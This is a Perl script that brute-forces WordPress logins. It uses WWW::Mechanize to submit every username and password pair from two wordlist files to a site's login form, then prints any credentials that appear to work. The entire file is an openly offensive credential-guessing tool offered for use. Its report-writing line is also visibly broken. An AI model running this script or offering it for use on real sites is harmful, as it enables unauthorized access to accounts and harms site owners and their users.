#!/usr/bin/perl -w

use strict;
use utf8;
use WWW::Mechanize;

binmode(STDOUT, ':encoding(cp850)');
binmode(STDIN, ':encoding(cp850)');

#parameters

my $url = $ARGV[0];
my $admin = $ARGV[1];
my $password = $ARGV[2];
my $report = $ARGV[3];

# Parameter checking function
sub verific_arguments
    {
        my $answer = 0;
     foreach(@ARGV)
     {
        $answer += 1;
        print "Arguments -> $_ \n\n";
     }
     return ($answer >= 3 ? 1:0);
    }

#Checking parameters
if (!verific_arguments)
{
    print "\n\nYou need write: \n";
    print "\nFB_wordpress.pl <URL> <ADMIN> <PASSWORD> OPTIONAL<REPORT> \n\n";
}
else 
{   
    # Creating instance
    my $utility = WWW::Mechanize->new();
    
    # Open URL
    
    $utility->get($url);
    
    # Opening file containing usernames
    open(fileadmin, '<', $admin) || die("\nFile $admin don't found");
    while(<fileadmin>)
    {
        my $adm = $_;
        chomp($adm);
        #Opening file containing passwords
        open(filepass, '<', $password) || die("\nFile $password dont fount");
        while (<filepass>)
        {
            chomp($_);
            #Load Form
            $utility->submit_form
                            (
                                #Looking <form id="loginform">
                                form_id => "loginform",
                                #pass user and password to inputs
                                fields => {log => $adm, pwd => $_}
                            );
            #Showing Data
            print "$adm:$_\n";
            #Cheking answer of wordpress site
            my $content = $utility->content;
            if ($content =~ /Hola/ || $content =~ /Hello/)
            {
               print "\n\n!!!Data acces found -> user: $adm password: $_";
               if ($report)
               {
                open(filereport. '>', $report);
                print filereport "!!!Data acces found -> user: $adm password: $_ !!!";
                close (filereport);
                print "\nYou can found the information on $report file";
               }
               exit;
            }
        }
	close(filepass);
    }
    close(fileadmin);
    print "\n\tPassword and username don't found :(\n\n";
}
